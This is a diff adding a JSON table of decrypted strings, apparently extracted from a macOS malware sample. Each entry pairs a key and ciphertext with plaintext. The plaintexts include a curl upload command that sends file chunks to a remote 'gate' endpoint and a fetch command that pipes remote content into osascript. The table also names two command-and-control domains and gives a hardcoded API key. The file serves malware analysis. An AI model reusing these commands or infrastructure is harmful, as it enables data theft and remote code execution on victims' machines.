@@ -1,0 +1,104 @@
+[
+  {
+    "label": "upload-command",
+    "key": "0x60d20f0d",
+    "ciphertext_hex": "696bf2096b32f7132d6da15d3c2fa10b647fef45616bf203627abc14302abe042d3dec4f696aa44f637abe0c2d73f203787dbe402064f24d7e2fff382d5f87342d22ff046c7bb34d6f66bc017f76f220202fff282d2d8713687dff216a6abc14372f9f0f7766be0c6c20e74e3d2ffa2d6c6cbb0e7960a108362f9b0e796abe40406eb140425cf2382d3ee23f3c3a8d57242f9126436aa617627db94f496ea0176461f2523b21e24e3d2f93107d63b737686d99097920e7533a21e1562f2fff282d2db3106422b9057435f2457e2df24d2062b318207bbb0d682fe3583d2fff0f2d20b6057b20bc156163f24d7a2ff0452874ba14797f8d03626bb71d2f2fec40287cf2523320b6057b20bc156163f242287ce84f222aa14f6a6ea605326da709616ba6186932f7132b7aa20c626eb63f646bef457e29b1087861b93f6461b6057532f7042b7bbd146c638d03657abc0b7e32f7042f0f",
+    "plaintext": "dd if=%s bs=1 skip=%ld count=%ld 2>/dev/null | curl -k -s -X PUT --data-binary @- -H \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) CFNetwork/Darwin 26.0.0 AppleWebKit/537.36\" -H \"api-key: %s\" --max-time 180 -o /dev/null -w \"%%{http_code}\" > %s 2>/dev/null \"%s://%s/gate?buildtxd=%s&upload_id=%s&chunk_index=%d&total_chunks=%d\""
+  },
+  {
+    "label": "upload-id-format",
+    "key": "0x2a039441",
+    "ciphertext_hex": "64f8670764a43b5241",
+    "plaintext": "%ld-%08x"
+  },
+  {
+    "label": "archive-path",
+    "key": "0x6135133",
+    "ciphertext_hex": "1c257e761c3e60675f3e74615a3f742849386306",
+    "plaintext": "/tmp/osalogging.zip"
+  },
+  {
+    "label": "host-format",
+    "key": "0x618fb492",
+    "ciphertext_hex": "b7c7aa1292",
+    "plaintext": "%s%s"
+  },
+  {
+    "label": "fetch-command",
+    "key": "0x59c09d07",
+    "ciphertext_hex": "64e8b23527b0ab792aeee0742af0a1212ae9a93462bdf16b27b0887925c8b33c75b0813e62f3b46327d0af236ef1ac3828a8ee6927b58d3864f4ae2d68eea86227d4ae2d62f1e01466fee01654bd987936ad9f6832c2f77027de861762e9b73675f6ef1d66efb73069bdf26f29adee6927dcb0296bf8973c65d6a92d28a8f36e29aef67b27b0887925fcb0302af6a5203dbde52a25bde27c74bfe02527f2b33874feb23077e9c0",
+    "plaintext": "curl -k -s --max-time 12 -H \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) CFNetwork/Darwin 26.0.0 AppleWebKit/537.36\" -H \"api-key: %s\" \"%s\" | osascript"
+  },
+  {
+    "label": "status-format",
+    "key": "0x53b39dd6",
+    "ciphertext_hex": "f3f9b3",
+    "plaintext": "%d"
+  },
+  {
+    "label": "probe-command",
+    "key": "0x437266f5",
+    "ciphertext_hex": "9613002fd54b1963d815526ed80b133bd8121b2e90464371d54b5f209a081c2696125f379c0b172c8012527bd54b3a63d7330126874b332490080679d52b1d399c0a1e22da535c73d54e3f22960f1c379a151a78d52f1c37900a520e9405520ca6462a63c4562d72c039456ad525340d9012052c870d5d079414052a9b464075db565c73d527023399032526972d1b37da534174db554461d54b3a63d707022ad80d173acf465730d74650668644526e9a465d2790105d2d800a1e63d8115261d043092b8112021c960916268844527dd5430163c7585d2790105d2d800a1e43",
+    "plaintext": "curl -k -s --max-time 12 --connect-timeout 8 -H \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) CFNetwork/Darwin 26.0.0 AppleWebKit/537.36\" -H \"api-key: %s\" \"%s\" -o /dev/null -w \"%%{http_code}\" > %s 2>/dev/null"
+  },
+  {
+    "label": "url-with-argument",
+    "key": "0x77188b05",
+    "ciphertext_hex": "20f822582aae6b5861f2761668e27b4871f37c4a20f83e0772ef2552768b",
+    "plaintext": "%s://%s/dynamic?txd=%s&pwd=%s"
+  },
+  {
+    "label": "url",
+    "key": "0x57e82b11",
+    "ciphertext_hex": "3458d2783e0e9b78755286367c428b6865538c6a3458e8",
+    "plaintext": "%s://%s/dynamic?txd=%s"
+  },
+  {
+    "label": "status-path",
+    "key": "0x88e4954",
+    "ciphertext_hex": "7b3de3787b67e67c2039ed67302c8e",
+    "plaintext": "/tmp/.httpcode"
+  },
+  {
+    "label": "api-key",
+    "key": "0x46cdbe2",
+    "ciphertext_hex": "d7ea553487bd5d33d1e85d3cd1ba5c6081ed5f6280ed5e37d1ee5b62d7ed0832e2",
+    "plaintext": "5190ef1733183a0dc63fb623357f56d6"
+  },
+  {
+    "label": "build-id",
+    "key": "0x427c3c55",
+    "ciphertext_hex": "675a1f756d5d4f74305d4c72310d4c2363584824375e1d71615e187b67084874615a45756d5a45776c04187b620c4d7634081d756d5d4572305e4f2163094e7755",
+    "plaintext": "2fc78a36ea00d10a6d4fbba34bd924464f978f9598d97014a4a78a90eb3c6525"
+  },
+  {
+    "label": "primary-domain",
+    "key": "0x77a4044d",
+    "ciphertext_hex": "236bd6032561d6193b6dd610246acd163d65cd19396dca106367cb1a4d",
+    "plaintext": "northernvirginiapainting.com"
+  },
+  {
+    "label": "fallback-domain",
+    "key": "0x56e509fe",
+    "ciphertext_hex": "997d893389689c789d668856",
+    "plaintext": "gtleway.com"
+  },
+  {
+    "label": "write-mode",
+    "key": "0x1c06dac8",
+    "ciphertext_hex": "bfda",
+    "plaintext": "w"
+  },
+  {
+    "label": "read-mode",
+    "key": "0x3ab50c2a",
+    "ciphertext_hex": "580c",
+    "plaintext": "r"
+  },
+  {
+    "label": "null-device",
+    "key": "0x10d63af1",
+    "ciphertext_hex": "de5eb366de54a37c9d3a",
+    "plaintext": "/dev/null"
+  }
+]
